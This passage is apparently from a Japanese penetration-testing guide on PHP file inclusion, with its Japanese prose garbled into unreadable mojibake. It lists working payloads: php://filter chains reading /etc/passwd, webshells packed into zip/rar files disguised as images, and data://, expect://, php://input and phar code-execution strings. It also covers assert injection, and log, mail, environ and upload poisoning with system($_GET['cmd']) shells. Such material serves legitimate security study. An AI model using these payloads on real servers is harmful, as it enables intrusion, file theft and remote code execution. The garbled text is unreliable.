* `string.toupper`
* `string.tolower`
* `string.strip_tags`: ãƒ‡ãƒ¼ã‚¿ã‹ã‚‰ã‚¿ã‚°ã‚’å‰Šé™¤ã—ã¾ã™ï¼ˆ"<" ã¨ ">" ã®é–“ã®ã™ã¹ã¦ï¼‰
* ã“ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ç¾ä»£ã® PHP ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‹ã‚‰ã¯ãªããªã£ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„
* [å¤‰æ›ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/ja/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : ç•°ãªã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã«å¤‰æ›ã—ã¾ã™ï¼ˆ`convert.iconv.<input_enc>.<output_enc>`ï¼‰ã€‚ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹**ã™ã¹ã¦ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®ãƒªã‚¹ãƒˆ**ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œã—ã¾ã™ï¼š`iconv -l`

{% hint style="warning" %}
`convert.iconv.*` å¤‰æ›ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’æ‚ªç”¨ã™ã‚‹ã¨ã€**ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’ç”Ÿæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’æ›¸ãè¾¼ã‚“ã ã‚Šã€include é–¢æ•°ãŒä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’å‡¦ç†ã™ã‚‹ã‚ˆã†ã«ã™ã‚‹ã®ã«å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
{% endhint %}

* [åœ§ç¸®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/ja/filters.compression.php)
* `zlib.deflate`: ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’åœ§ç¸®ã—ã¾ã™ï¼ˆå¤šãã®æƒ…å ±ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™å ´åˆã«ä¾¿åˆ©ã§ã™ï¼‰
* `zlib.inflate`: ãƒ‡ãƒ¼ã‚¿ã‚’è§£å‡ã—ã¾ã™
* [æš—å·åŒ–ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/ja/filters.encryption.php)
* `mcrypt.*` : å»ƒæ­¢äºˆå®š
* `mdecrypt.*` : å»ƒæ­¢äºˆå®š
* ãã®ä»–ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼
* PHP ã§ `var_dump(stream_get_filters());` ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ã„ãã¤ã‹ã®**äºˆæœŸã—ãªã„ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
* `consumed`
* `dechunk`: HTTP ãƒãƒ£ãƒ³ã‚¯ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’é€†ã«ã—ã¾ã™
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
éƒ¨åˆ† "php://filter" ã¯å¤§æ–‡å­—å°æ–‡å­—ã‚’åŒºåˆ¥ã—ã¾ã›ã‚“
{% endhint %}

### php://fd

ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ãŒé–‹ã„ã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚é–‹ã„ã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’æŠœãå‡ºã™ã®ã«å½¹ç«‹ã¤å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
### zip:// ã¨ rar://

PHPShellãŒå†…è”µã•ã‚ŒãŸZipã¾ãŸã¯Rarãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚\
rarãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€**ç‰¹ã«æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

(ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«ã¯ç¿»è¨³ã™ã‚‹ã¹ããƒ†ã‚­ã‚¹ãƒˆãŒå«ã¾ã‚Œã¦ã„ã¾ã›ã‚“ã€‚)
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### expect://

Expectã¯æœ‰åŠ¹ã«ã•ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒ‡å®šã—ã¾ã™
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

`.phar` ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ã‚¦ã‚§ãƒ–ãŒ `include` ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¦ã„ã‚‹å ´åˆã€PHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
```
ãã—ã¦ã€ä»¥ä¸‹ã®è¡Œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§`phar`ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã§ãã¾ã™:
```
```bash
php --define phar.readonly=0 create_path.php
```
`test.phar` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒç”Ÿæˆã•ã‚Œã€LFIã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

LFIãŒãƒ•ã‚¡ã‚¤ãƒ«å†…ã®PHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã›ãšã«èª­ã¿å–ã£ã¦ã„ã‚‹å ´åˆã€ä¾‹ãˆã° _**file\_get\_contents(), fopen(), file() ã‚„ file\_exists(), md5\_file(), filemtime() ã‚„ filesize()**_**.** ãªã©ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**phar** ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**èª­ã¿å–ã‚‹**éš›ã«ç™ºç”Ÿã™ã‚‹ **ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®æŠ•ç¨¿ã‚’èª­ã‚“ã§ãã ã•ã„:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### ãã®ä»–ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«

ã“ã¡ã‚‰ã§å¯èƒ½ãª[ **ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ã•ã‚‰ã«ç¢ºèªã—ã¦ãã ã•ã„**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory ã¨ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” ãƒ¡ãƒ¢ãƒªã¾ãŸã¯ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³æ”»æ’ƒã§ã©ã®ã‚ˆã†ã«å½¹ç«‹ã¤ã‹ã¯ä¸æ˜ï¼‰
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” HTTP(s) URLã«ã‚¢ã‚¯ã‚»ã‚¹
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” FTP(s) URLã«ã‚¢ã‚¯ã‚»ã‚¹
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” åœ§ç¸®ã‚¹ãƒˆãƒªãƒ¼ãƒ 
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” ãƒ‘ã‚¿ãƒ¼ãƒ³ã«ãƒãƒƒãƒã™ã‚‹ãƒ‘ã‚¹åã‚’æ¤œç´¢ï¼ˆå°åˆ·å¯èƒ½ãªã‚‚ã®ã‚’è¿”ã•ãªã„ã®ã§ã€ã“ã“ã§ã¯ã‚ã¾ã‚Šå½¹ã«ç«‹ãŸãªã„ï¼‰
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” ã‚»ã‚­ãƒ¥ã‚¢ã‚·ã‚§ãƒ« 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” ã‚ªãƒ¼ãƒ‡ã‚£ã‚ªã‚¹ãƒˆãƒªãƒ¼ãƒ ï¼ˆä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚€ãŸã‚ã«ã¯å½¹ã«ç«‹ãŸãªã„ï¼‰

## PHPã® 'assert' ã‚’åˆ©ç”¨ã—ãŸLFI

".." ã®ã‚ˆã†ãªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«æ–‡å­—åˆ—ã‚’ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã€"Hacking attempt" ã‚„ "Nice try!" ã¨ã„ã£ãŸåå¿œãŒã‚ã‚‹é›£ã—ã„LFIã«é­é‡ã—ãŸå ´åˆã€'assert' ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã“ã®ã‚ˆã†ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ã™:
```
' and die(show_source('/etc/passwd')) or '
```
PHPã‚³ãƒ¼ãƒ‰ã‚’æ¬¡ã®ã‚ˆã†ãªã€Œfileã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã§æ­£å¸¸ã«ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã—ã¾ã™ï¼š
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
è„†å¼±ãª "assert" ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€system() é–¢æ•°ã‚’ç”¨ã„ã¦ RCE ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š
```
' and die(system("whoami")) or '
```
ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã™ã‚‹å‰ã«ã€å¿…ãšURLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„ã€‚

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«ã€[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨æŒ‘æˆ¦ã«ç„¦ç‚¹ã‚’å½“ã¦ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã™ã‚‹

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€é€Ÿã„ãƒšãƒ¼ã‚¹ã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«è¿½ã„ã¤ã

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹ãƒ¡ãƒ³ãƒˆ**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã¨é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã—ã¾ã—ã‚‡ã†ï¼

## PHP Blind Path Traversal

{% hint style="warning" %}
ã“ã®æŠ€è¡“ã¯ã€**PHPé–¢æ•°**ã®**ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹**ã‚’**åˆ¶å¾¡**ã—ã¦ã„ã‚‹å ´åˆã«é–¢é€£ã—ã¾ã™ãŒã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ï¼ˆä¾‹ãˆã°ã€**`file()`**ã®å˜ç´”ãªå‘¼ã³å‡ºã—ã®ã‚ˆã†ã«ï¼‰ã€‚ã—ã‹ã—ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚
{% endhint %}

[**ã“ã®ç´ æ™´ã‚‰ã—ã„æŠ•ç¨¿**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)ã§ã¯ã€ã‚¨ãƒ©ãƒ¼ã‚ªãƒ©ã‚¯ãƒ«ã‚’ä»‹ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’**æŠ½å‡ºã™ã‚‹**ãŸã‚ã«ã€ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãŒPHPãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä»‹ã—ã¦ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã•ã‚Œã‚‹ã‹ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

è¦ç´„ã™ã‚‹ã¨ã€ã“ã®æŠ€è¡“ã¯**"UCS-4LE"ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’éå¸¸ã«**å¤§ãã**ã—ã€PHPé–¢æ•°ãŒãƒ•ã‚¡ã‚¤ãƒ«ã‚’é–‹ãéš›ã«**ã‚¨ãƒ©ãƒ¼**ã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚

æ¬¡ã«ã€ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼**`dechunk`**ã‚’ä½¿ç”¨ã—ã¦æœ€åˆã®æ–‡å­—ã‚’æ¼æ´©ã•ã›ã€ä»–ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ï¼ˆ**base64**ã‚„**rot13**ãªã©ï¼‰ã¨çµ„ã¿åˆã‚ã›ã¦ã€æœ€çµ‚çš„ã«ã¯**convert.iconv.UCS-4.UCS-4LE**ã¨**convert.iconv.UTF16.UTF-16BE**ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã€ä»–ã®æ–‡å­—ã‚’å…ˆé ­ã«é…ç½®ã—ã€ãã‚Œã‚‰ã‚’æ¼æ´©ã•ã›ã¾ã™ã€‚

**è„†å¼±æ€§ãŒã‚ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹é–¢æ•°**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

æŠ€è¡“çš„ãªè©³ç´°ã«ã¤ã„ã¦ã¯ã€ä¸Šè¨˜ã®æŠ•ç¨¿ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

## LFI2RCE

### Remote File Inclusion

ä»¥å‰ã«èª¬æ˜ã—ãŸé€šã‚Šã€[**ã“ã®ãƒªãƒ³ã‚¯ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**](./#remote-file-inclusion)ã€‚

### Apache/Nginxãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«çµŒç”±

Apacheã¾ãŸã¯Nginxã‚µãƒ¼ãƒãƒ¼ãŒ**LFIã«è„†å¼±**ã§ã‚ã‚‹å ´åˆã€includeé–¢æ•°å†…ã§**`/var/log/apache2/access.log`ã¾ãŸã¯`/var/log/nginx/access.log`**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ**å†…ã¾ãŸã¯**GETãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼**å†…ã«phpã‚·ã‚§ãƒ«ã‚’è¨­å®šã—ã€**`<?php system($_GET['c']); ?>`**ã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«ã‚’å«ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="warning" %}
ã‚·ã‚§ãƒ«ã«**å˜å¼•ç”¨ç¬¦**ã®ä»£ã‚ã‚Šã«**äºŒé‡å¼•ç”¨ç¬¦**ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€äºŒé‡å¼•ç”¨ç¬¦ã¯æ–‡å­—åˆ—"_**quote;**_"ã«å¤‰æ›´ã•ã‚Œã€**PHPã¯ãã“ã§ã‚¨ãƒ©ãƒ¼ã‚’æŠ•ã’**ã€ãã‚Œä»¥å¤–ã®ã“ã¨ã¯**å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“**ã€‚

ã¾ãŸã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’**æ­£ã—ãæ›¸ã**ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚ãã†ã§ãªã„ã¨PHPã¯ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚‚ã†ã¨ã™ã‚‹ãŸã³ã«ã‚¨ãƒ©ãƒ¼ã‚’å‡ºã—ã€äºŒåº¦ç›®ã®ãƒãƒ£ãƒ³ã‚¹ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ã“ã‚Œã¯ä»–ã®ãƒ­ã‚°ã§ã‚‚è¡Œã†ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒ­ã‚°å†…ã®ã‚³ãƒ¼ãƒ‰ãŒURLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ã“ã‚Œã«ã‚ˆã£ã¦ã‚·ã‚§ãƒ«ãŒç ´å£Šã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒ˜ãƒƒãƒ€ãƒ¼**authorisation "basic"**ã«ã¯Base64ã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸ"user:password"ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãƒ­ã‚°å†…ã§ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ã€‚PHPShellã¯ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼å†…ã«æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ä»–ã®å¯èƒ½ãªãƒ­ã‚°ãƒ‘ã‚¹ï¼š
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆ: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### ãƒ¡ãƒ¼ãƒ«çµŒç”±

**ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡**ã—ã¦ã€PHPãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ï¼ˆä¾‹ï¼š`<?php echo system($_REQUEST["cmd"]); ?>`ï¼‰ã‚’å†…éƒ¨ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆuser@localhostï¼‰ã«å«ã‚ã€**`/var/mail/<USERNAME>`** ã‚„ **`/var/spool/mail/<USERNAME>`** ã®ã‚ˆã†ãªãƒ‘ã‚¹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

### /proc/\*/fd/\* çµŒç”±

1. å¤šãã®ã‚·ã‚§ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ï¼ˆä¾‹ï¼š100å€‹ï¼‰
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã¾ã™ã€‚ã“ã“ã§ $PID = ãƒ—ãƒ­ã‚»ã‚¹ã®PIDï¼ˆãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹å¯èƒ½ï¼‰ã€$FD = ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ï¼ˆã“ã‚Œã‚‚ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹å¯èƒ½ï¼‰

### /proc/self/environ çµŒç”±

ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚ˆã†ã«ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’User-Agentã«é€ä¿¡ã—ã¾ã™ã€‚ã“ã‚Œã¯ /proc/self/environ ãƒ•ã‚¡ã‚¤ãƒ«å†…ã«åæ˜ ã•ã‚Œã¾ã™ã€‚
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’é€šã˜ã¦

ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹å ´åˆã¯ã€ã‚·ã‚§ãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãã®ä¸­ã«æ³¨å…¥ã—ã¦ãã ã•ã„ï¼ˆä¾‹ï¼š `<?php system($_GET['c']); ?>`ï¼‰ã€‚
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿ã‚„ã™ãä¿ã¤ãŸã‚ã«ã¯ã€å†™çœŸ/ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ/PDFã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«æ³¨å…¥ã™ã‚‹ã®ãŒæœ€é©ã§ã™

### ZIPãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰çµŒç”±

